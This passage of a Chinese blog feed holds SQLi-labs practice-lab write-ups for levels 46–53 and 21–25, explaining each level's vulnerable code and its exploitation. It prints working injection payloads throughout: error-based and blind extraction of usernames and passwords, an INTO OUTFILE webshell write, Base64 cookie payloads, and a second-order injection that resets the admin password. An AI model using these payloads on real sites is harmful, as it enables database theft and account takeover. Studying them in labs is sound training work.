src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/06.png" alt="Less-46"></p><h4 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h4><p><code>?sort=1 and updatexml(1,concat(&#39;~&#39;,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;)),0)</code><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/07.png" alt="Less-46"></p><h4 id="爆users表的表列"><a href="#爆users表的表列" class="headerlink" title="爆users表的表列"></a>爆<code>users</code>表的表列</h4><p><code>?sort=1 and updatexml(1,concat(&#39;~&#39;,(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),0)</code><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/08.png" alt="Less-46"></p><h4 id="爆users表的数据"><a href="#爆users表的数据" class="headerlink" title="爆users表的数据"></a>爆<code>users</code>表的数据</h4><p><code>?sort=1 and updatexml(1,concat(&#39;~&#39;,(select concat_ws(&#39;~&#39;,id,username,password)from security.users limit 0,1)),0)</code><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/09.png" alt="Less-46"></p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>数据库第 1 位为：s</p><pre><code class="hljs sql">?sort=rand(left(database(),1)&gt;&#x27;r&#x27;)?sort=rand(left(database(),1)&gt;&#x27;s&#x27;)?sort=rand(left(database(),2)&gt;&#x27;sd&#x27;)?sort=rand(left(database(),2)&gt;&#x27;se&#x27;)</code></pre><h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p><pre><code class="hljs sql">?sort=rand(if(ascii(substr(database(),1,1))&gt;114,1,sleep(1)))?sort=rand(if(ascii(substr(database(),1,1))&gt;115,1,sleep(1)))</code></pre><h3 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h3><p><strong>将查询结果导入到文件中</strong>：</p><pre><code class="hljs Sql">?sort=1 into outfile &quot;D:/phpstudy_pro/WWW/sqli.pl/Less-46/less46.txt&quot;</code></pre><p>如果导入不成功的话，很可能是因为 Web 目前 MySQL 没有读写权限造成的。</p><p><strong>利用导出文件 getshell</strong>：</p><p>注入天书里面提供了 lines terminated by 姿势用于 order by 的情况来 getsgell：</p><pre><code class="hljs Payload">?sort&#x3D;1 into outfile &quot;D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;sqli.pl&#x2F;Less-46&#x2F;shell.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e</code></pre><p>3c3f70687020706870696e666f28293b3f3e 是 <code>&lt;php phpinfo();&gt;</code> 的十六进制编码。</p><p>来查看下写入的文件内容是啥样子的：</p><pre><code class="hljs Bash">1DumbDumb&lt;?php phpinfo();?&gt;2AngelinaI-kill-you&lt;?php phpinfo();?&gt;3Dummyp@ssword&lt;?php phpinfo();?&gt;4securecrappy&lt;?php phpinfo();?&gt;5stupidstupidity&lt;?php phpinfo();?&gt;6supermangenious&lt;?php phpinfo();?&gt;7batmanmob!le&lt;?php phpinfo();?&gt;8adminadmin&lt;?php phpinfo();?&gt;9admin1admin1&lt;?php phpinfo();?&gt;10admin2admin2&lt;?php phpinfo();?&gt;11admin3admin3&lt;?php phpinfo();?&gt;12dhakkandumbo&lt;?php phpinfo();?&gt;14admin4admin4&lt;?php phpinfo();?&gt;15helloworld&lt;?php phpinfo();?&gt;</code></pre><p>浏览器访问测试看看：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200722_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A538-53%E5%85%B3/10.png" alt="Less-46"></p><h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-46 相比，利用方式不变，只是拼接方式方式变化，注入的时候只要正常闭合即可。</p><pre><code class="hljs sql">?sort=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">0</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>ORDER BY $id</code></td></tr></tbody></table><p>和 Less-46 相比少了报错注入，布尔、延时盲注依然可以正常使用，这里不再过多演示了。</p><h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-47 相比少了报错注入，布尔、延时盲注依然可以正常使用，这里不再过多演示了。</p><h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注、堆叠注入</td><td><code>ORDER BY $id</code></td></tr></tbody></table><p>和 Less-46 相比，查询方式由 mysql_query 变成了 mysqli_multi_query，因此支持堆叠注入，在注入方面会更加灵活。堆叠注入的话这里不再演示，详细细节可以参考 Less-38 的堆叠注入的姿势。</p><h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注、堆叠注入</td><td><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-50 相比只是拼接方式发生了变化，实际注入的时候只需做一下对应的闭合即可。</p><h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注、堆叠注入</td><td><code>ORDER BY $id</code></td></tr></tbody></table><p>和 Less-50 是一样的，只是少了报错注入的利用方式。</p><h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注、堆叠注入</td><td><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-51 是一样的，只是少了报错注入的利用方式。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;堆叠注入-38-53-关&quot;&gt;&lt;a href=&quot;#堆叠注入-38-53-关&quot; class=&quot;headerlink&quot; title=&quot;堆叠注入 38-53 关&quot;&gt;&lt;/a&gt;堆叠注入 38-53 关&lt;/h1&gt;&lt;h2 id=&quot;原理介绍&quot;&gt;&lt;a href=&quot;#原理介绍&quot; cla</summary>
      
    
    
    
    <category term="WEB安全" scheme="http://www.secice.cn/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="SQL注入" scheme="http://www.secice.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli lab" scheme="http://www.secice.cn/tags/sqli-lab/"/>
    
  </entry>
  
  <entry>
    <title>SQLI labs 靶场笔记之高级注入姿势 21-37 关</title>
    <link href="http://www.secice.cn/p/4c595109"/>
    <id>http://www.secice.cn/p/4c595109</id>
    <published>2020-07-21T05:20:26.000Z</published>
    <updated>2020-12-24T02:16:44.861Z</updated>
    
    <content type="html"><![CDATA[<h1 id="高级注入姿势-21-37-关"><a href="#高级注入姿势-21-37-关" class="headerlink" title="高级注入姿势 21-37 关"></a>高级注入姿势 21-37 关</h1><h2 id="Less-21-Cookie-Base64编码注入"><a href="#Less-21-Cookie-Base64编码注入" class="headerlink" title="Less-21(Cookie Base64编码注入)"></a>Less-21(Cookie Base64编码注入)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=(&#39;$cookee&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> cookie 中不存在 uname 参数:      输出了一堆无用的信息    <span class="hljs-keyword">if</span> 提交了 uname 和 passwd:        <span class="hljs-comment"># 进行过滤</span>        <span class="hljs-variable">$uname</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]);        <span class="hljs-variable">$passwd</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]);        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="hljs-subst">$uname</span> and users.password=<span class="hljs-subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;        <span class="hljs-keyword">if</span> 有查询结果:            <span class="hljs-comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>            setcookie(<span class="hljs-string">&#x27;uname&#x27;</span>, base64_encode(<span class="hljs-variable">$row1</span>[<span class="hljs-string">&#x27;username&#x27;</span>]), time()+<span class="hljs-number">3600</span>);            <span class="hljs-keyword">else</span>:            print_r(mysql_error());<span class="hljs-keyword">else</span>:    <span class="hljs-keyword">if</span> POST 数据里面没有 submit 参数:                 <span class="hljs-comment"># 对 cookee 进行 base64 解密</span>        <span class="hljs-variable">$cookee</span> = base64_decode(<span class="hljs-variable">$cookee</span>);        <span class="hljs-comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span>        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;        <span class="hljs-keyword">if</span> 查询无结果:            输出 mysql_error()        <span class="hljs-keyword">if</span> 有结果:            输出查询的信息    <span class="hljs-keyword">else</span>:        <span class="hljs-comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>        setcookie(<span class="hljs-string">&#x27;uname&#x27;</span>, base64_encode(<span class="hljs-variable">$row1</span>[<span class="hljs-string">&#x27;username&#x27;</span>]), time()<span class="hljs-number">-3600</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>从源码中分析可得，和 Less-20 基本上是一毛一样，只是 Coojie 这里是经过 base64 加密的，所以我们只需要传入加密后的 payload 给 cookie 的 uname 即可，下面就只用报错注入来简单演示一下吧：</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-21/index.php</span> HTTP/1.1<span class="hljs-attribute">Host</span>: sqli.pl<span class="hljs-attribute">Cache-Control</span>: max-age=0<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<span class="hljs-attribute">Referer</span>: http://sqli.pl/Less-21/<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9<span class="hljs-attribute">Cookie</span>: uname=YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VybmFtZSBmcm9tIHVzZXJzIGxpbWl0IDEsMSksMHg3ZSksMSkj<span class="hljs-attribute">Connection</span>: close</code></pre><p>Cookie 的 uname 参数 Base64 解码为：</p><pre><code class="hljs sql">admin&#x27;) and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span></code></pre><p>联合注入</p><pre><code class="hljs sql">-admin&#x27;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">#</span></code></pre><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&quot;$cookee&quot;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre><code class="hljs php"><span class="hljs-comment"># 先双引号 然后直接拼接到SQL语句中</span><span class="hljs-variable">$cookee1</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span>. <span class="hljs-variable">$cookee</span>. <span class="hljs-string">&#x27;&quot;&#x27;</span>;    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=<span class="hljs-subst">$cookee1</span> LIMIT 0,1&quot;</span>;</code></pre><p>可以发现和 Less-21 相比，只是拼接方式不一样，其他都是一致的，这里就不再啰嗦了。</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-22/index.php</span> HTTP/1.1<span class="hljs-attribute">Host</span>: sqli.pl<span class="hljs-attribute">Pragma</span>: no-cache<span class="hljs-attribute">Cache-Control</span>: no-cache<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<span class="hljs-attribute">Referer</span>: http://sqli.pl/Less-22/<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9<span class="hljs-attribute">Cookie</span>: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLChzZWxlY3QgZ3JvdXBfY29uY2F0KHVzZXJuYW1lLCc6JyxwYXNzd29yZCkgZnJvbSB1c2VycykgIw==<span class="hljs-attribute">Connection</span>: close</code></pre><p>Cookie 的 uname 参数 Base64 解码为：</p><pre><code class="hljs sql">-admin&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">#</span></code></pre><h2 id="Less-23-过滤-、–注释"><a href="#Less-23-过滤-、–注释" class="headerlink" title="Less-23(过滤#、–注释)"></a>Less-23(过滤#、–注释)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre><code class="hljs php"><span class="hljs-comment"># 获取到 id 的值</span><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<span class="hljs-comment"># 过滤了 id 中的 # 和 -- 然后 替换为 空</span><span class="hljs-variable">$reg</span> = <span class="hljs-string">&quot;/#/&quot;</span>;<span class="hljs-variable">$reg1</span> = <span class="hljs-string">&quot;/--/&quot;</span>;<span class="hljs-variable">$replace</span> = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-variable">$id</span> = preg_replace(<span class="hljs-variable">$reg</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span> = preg_replace(<span class="hljs-variable">$reg1</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 使用单引号拼接 SQL</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> 有查询结果:    输出查询信息<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><p><strong>过滤了注释符号</strong>，但是这里还可以考虑使用闭合方式来进行注入，下面直接使用最简单的联合查询注入吧：</p><p>Payload</p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><h2 id="Less-24-二次注入"><a href="#Less-24-二次注入" class="headerlink" title="Less-24(二次注入)"></a>Less-24(二次注入)</h2><p>一个经典的二次注入场景，所以下面来单个理一下源码。</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><ul><li><code>index.php</code></li></ul><p>主要记录了表单相关的信息，没有啥敏感代码，当做 Index.html 来看待就可以了，具体的界面如下：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/01.png" alt="Less-24(二次注入)"></p><p>提示输入用户名和密码，用户名和密码正确之后就可以成功登陆，否则登陆失败。</p><p><code>忘记密码</code>：左下角的忘记密码选项提示：如果你忘记密码 请 hack it</p><p><code>新建用户</code>：右下角新建用户可以新建一个自己的用户</p><ul><li><code>failed.php</code></li></ul><p>检测会话，如果 cookie 里面没有 Auth 参数的话，就跳转到 index.php</p><ul><li><code>forgot_password.php</code></li></ul><p>简单提示：如果你忘记密码 请 hack it</p><ul><li><code>Logged-in.php</code></li></ul><p>登录后的信息展示，显示登录名称并且提供了修改密码的表单</p><ul><li><code>new_user.php</code></li></ul><p>创建新用户的表单页面，本文件主要存放前段代码。</p><ul><li><code>login_create.php</code></li></ul><p>创建新用户的后端代码，下面来简单理一下代码的流程：</p><pre><code class="hljs Php"><span class="hljs-comment"># 接受用户提交的用户名和密码值 并进行 mysql 安全函数转义</span>username=  mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) ;<span class="hljs-variable">$pass</span>= mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<span class="hljs-variable">$re_pass</span>= mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;re_password&#x27;</span>]);<span class="hljs-comment"># 查询当前用户信息</span><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select count(*) from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;如果当前用户已经存在 无法注册<span class="hljs-keyword">if</span> 两次输入密码一致：  <span class="hljs-comment"># 将记录插入数据库中</span>  <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into users ( username, password) values(\&quot;<span class="hljs-subst">$username</span>\&quot;, \&quot;<span class="hljs-subst">$pass</span>\&quot;)&quot;</span>;    查询完成后 重定向到首页<span class="hljs-keyword">else</span>:    提示两次输入密码不一致</code></pre><ul><li><code>login.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-comment"># 登录用户名和密码都被过滤了</span><span class="hljs-variable">$username</span> = mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<span class="hljs-variable">$password</span> = mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>]);<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;</code></pre><ul><li><code>pass_change.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-keyword">if</span> 检测未登录：    重定向到首页<span class="hljs-keyword">if</span> 检测到提交表单：  <span class="hljs-comment"># 对 pass 都进行了过滤</span>  <span class="hljs-variable">$username</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>];    <span class="hljs-variable">$curr_pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;current_password&#x27;</span>]);    <span class="hljs-variable">$pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);    <span class="hljs-variable">$re_pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;re_password&#x27;</span>]);    <span class="hljs-keyword">if</span> 两次密码一致:        <span class="hljs-comment"># 直接将 username 拼接到 SQL 语句</span>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span>;    <span class="hljs-keyword">else</span>:        提示密码不一致 并重定向到 fail.php</code></pre><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>从代码上来看貌似都被转义了，乍一看是成功注入的。实际上的确不能使用常规的思路来进行注入，因为这题是二次注入，ISCC 2019 当时使用这题的考查点是修改掉 admin 用户的密码，然后再登录即可。假设不知道 admin 用户的情况下，想要修改掉 admin 用户的密码的话，这里就使用的是二次注入的姿势了。</p><p><strong>二次注入</strong> 简单概括就是黑客精心构造 SQL 语句插入到数据库中，数据库报错的信息被其他类型的 SQL 语句调用的时候触发攻击行为。因为第一次黑客插入到数据库的时候并没有触发危害性，而是再其他语句调用的时候才会触发攻击行为，这个就是二次注入。</p><p>先看创建用户的地方：</p><pre><code class="hljs php">username =  mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) ;</code></pre><p>username 被 <code>mysql_escape_string</code> 函数过滤了，该函数的作用如下：</p><table><thead><tr><th>危险字符</th><th>转义后</th></tr></thead><tbody><tr><td><code>\</code></td><td><code>\\</code></td></tr><tr><td><code>&#39;</code></td><td><code>\&#39;</code></td></tr><tr><td><code>&quot;</code></td><td><code>\&quot;</code></td></tr></tbody></table><p>再看下更新密码的核心语句：</p><pre><code class="hljs Sql"><span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;$username&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;$curr_pass&#x27;</span></code></pre><p>这里直接使用单引号拼接了 username 所以当 username 可控的话 ，这里是存在SQL注入的，假设用户注册的 username 的值为：<code>admin&#39;#</code>，那么此时的完整语句就为：</p><pre><code class="hljs Sql"><span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span><span class="hljs-comment"># and password=&#x27;$curr_pass&#x27;</span></code></pre><p>此时就完全改变了语义，直接就修改掉了 admin 用户的密码。</p><h3 id="步骤演示"><a href="#步骤演示" class="headerlink" title="步骤演示"></a>步骤演示</h3><p>常见一个<code>admin&#39;#</code>开头的用户名，下面列举的几种都可以，以此类推，很灵活：</p><pre><code class="hljs jboss-cli">admin&#x27;<span class="hljs-comment">#1</span>admin&#x27;<span class="hljs-comment">#233</span>admin&#x27;<span class="hljs-comment">#gg</span><span class="hljs-string">...</span></code></pre><p>注册完成后数据库的记录信息如下：</p><pre><code class="hljs Bash">mysql&gt; select * from users;+----+------------+----------+| id | username   | password |+----+------------+----------+|  1 | Dumb       | 0        ||  2 | Angelina   | 0        ||  3 | Dummy      | 0        ||  4 | secure     | 0        ||  5 | stupid     | 0        ||  6 | superman   | 0        ||  7 | batman     | 0        ||  8 | admin      | 0        ||  9 | admin1     | 0        || 10 | admin2     | 0        || 11 | admin3     | 0        || 12 | dhakkan    | 0        || 14 | admin4     | 0        || 15 | admin<span class="hljs-string">&#x27;#sec | 123      |</span><span class="hljs-string">+----+------------+----------+</span><span class="hljs-string">14 rows in set (0.00 sec)</span></code></pre><p>成功添加了记录，这里单引号数据库中中看没有被虽然转义了，这是因为转义只不过是暂时的，最后存入到数据库的时候还是没变的。</p><p>接下来登录 `admin’#sec用户，然后来修改当前的密码：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/02.png" alt="Less-24(二次注入)"></p><p>此时来数据库中查看，可以发现成功修改掉了 admin 用的密码了：</p><pre><code class="hljs Bash">mysql&gt; select * from users;+----+------------+----------+| id | username   | password |+----+------------+----------+|  1 | Dumb       | 0        ||  2 | Angelina   | 0        ||  3 | Dummy      | 0        ||  4 | secure     | 0        ||  5 | stupid     | 0        ||  6 | superman   | 0        ||  7 | batman     | 0        ||  8 | admin      | 1234     ||  9 | admin1     | 0        || 10 | admin2     | 0        || 11 | admin3     | 0        || 12 | dhakkan    | 0        || 14 | admin4     | 0        || 15 | admin<span class="hljs-string">&#x27;#sec | 123      |</span><span class="hljs-string">+----+------------+----------+</span><span class="hljs-string">14 rows in set (0.00 sec)</span></code></pre><h2 id="Less-25-过滤or和and"><a href="#Less-25-过滤or和and" class="headerlink" title="Less-25(过滤or和and)"></a>Less-25(过滤or和and)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><h3 id="关键代码分析："><a href="#关键代码分析：" class="headerlink" title="关键代码分析："></a>关键代码分析：</h3><pre><code class="hljs Php"><span class="hljs-comment"># id 直接单引号拼接</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 但是 id 被如下函数过滤了</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/AND/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;</code></pre><p>过滤了 <code>or</code> <code>and</code> 